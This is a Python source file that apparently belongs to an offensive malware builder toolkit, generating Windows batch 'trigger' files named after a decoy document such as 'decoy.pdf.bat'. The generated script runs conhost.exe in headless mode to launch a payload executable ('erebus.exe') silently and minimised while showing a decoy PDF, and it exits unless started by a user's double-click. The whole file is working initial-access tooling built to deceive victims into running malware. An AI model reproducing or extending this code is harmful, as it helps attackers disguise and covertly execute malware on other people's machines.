import pathlib
import sys
import os

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE = AGENT_CODE / "decoys" / "decoy.pdf"

def create_bat_trigger(
    target_bin: str,
    args: str,
    decoy_file: str,
    payload_dir: pathlib.Path = None,
    output_filename: str = None
) -> pathlib.Path:
    """Create a BAT trigger file in the payloads directory

    Args:
        target_bin (str): Binary to execute (e.g., "C:\\Windows\\System32\\conhost.exe")
        args (str): Command arguments (e.g., "--headless cmd.exe /Q /c erebus.exe | decoy.pdf")
        decoy_file (str): Name of the decoy file (e.g., "decoy.pdf")
        payload_dir (pathlib.Path): Directory where payload files are stored
        output_filename (str): Output BAT filename (default: auto-generated from decoy_file)

    Returns:
        pathlib.Path: Path to the created BAT file
    """
    if payload_dir is None:
        payload_dir = PAYLOAD_DIR

    if output_filename is None:
        output_filename = f"{decoy_file}.bat"

    bat_output_path = payload_dir / output_filename
    target_bin_win = str(target_bin).replace('/', '\\')
    decoy_file_win = str(decoy_file).replace('/', '\\')

    bat_content = []
    bat_content.append("@echo off")
    bat_content.append('echo %cmdcmdline% | find /i "%~f0" >nul || exit')
    bat_content.append(f'start "" /min "{target_bin_win}" {args} >nul 2>&1')
    bat_content.append("exit")

    with open(bat_output_path, 'w', newline='\r\n') as f:
        f.write('\n'.join(bat_content))

    return bat_output_path

def create_bat_payload_trigger(
    target_bin: str = "C:\\Windows\\System32\\conhost.exe",
    args: str = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
    payload_dir: pathlib.Path = None,
    decoy_file: pathlib.Path = None,
) -> pathlib.Path:
    """Create BAT payload trigger with proper parameter naming

    Args:
        target_bin (str): Binary to execute (matches builder.py parameter "0.8 Trigger Binary")
        args (str): Command arguments (matches builder.py parameter "0.9 Trigger Command")
        payload_dir (pathlib.Path): Directory where payload files are stored
        decoy_file (pathlib.Path): Path to decoy file

    Returns:
        pathlib.Path: Path to the created BAT file
    """
    if decoy_file is None:
        decoy_file = DECOY_FILE

    decoy_filename = decoy_file.name

    return create_bat_trigger(
        target_bin=target_bin,
        args=args,
        decoy_file=decoy_filename,
        payload_dir=payload_dir
    )